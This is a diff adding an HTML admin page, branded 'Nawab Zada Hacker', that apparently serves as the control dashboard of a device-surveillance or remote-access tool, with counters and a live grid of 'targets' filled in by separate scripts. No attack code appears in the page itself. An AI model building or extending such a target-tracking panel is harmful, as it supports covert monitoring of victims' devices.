@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Anti Black Maling</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+</head>
+<body class="admin-layout">
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="brand">
+            <h3>🦅 Nawab Zada Hacker</h3>
+            <p>v1.0 Ultimate</p>
+        </div>
+        <nav>
+            <button onclick="window.location.href='index.html'" class="nav-btn">Home</button>
+            <button onclick="app.logout()" class="nav-btn logout">Logout</button>
+        </nav>
+    </aside>
+
+    <!-- Main Dashboard -->
+    <main class="dashboard-content">
+        <header class="dash-header">
+            <h1>🎯 Target Dashboard</h1>
+            <div class="stats-box">
+                <span id="totalTargets">0 Targets</span> | 
+                <span id="activeDevices">0 Active</span>
+            </div>
+        </header>
+
+        <!-- Stats Grid -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h4>Total Devices</h4>
+                <p id="countTotal" class="big-number">0</p>
+            </div>
+            <div class="stat-card">
+                <h4>Online Now</h4>
+                <p id="countOnline" class="big-number text-green">0</p>
+            </div>
+        </div>
+
+        <!-- Target List Container -->
+        <div class="target-list-wrapper">
+            <h2>📡 Live Targets</h2>
+            <div id="targetsGrid" class="grid-container">
+                <!-- JS will inject cards here -->
+                <p>Loading...</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Admin Logic Script -->
+    <script src="firebase-config.js"></script>
+    <script src="admin-logic.js"></script>
+</body>
+</html>
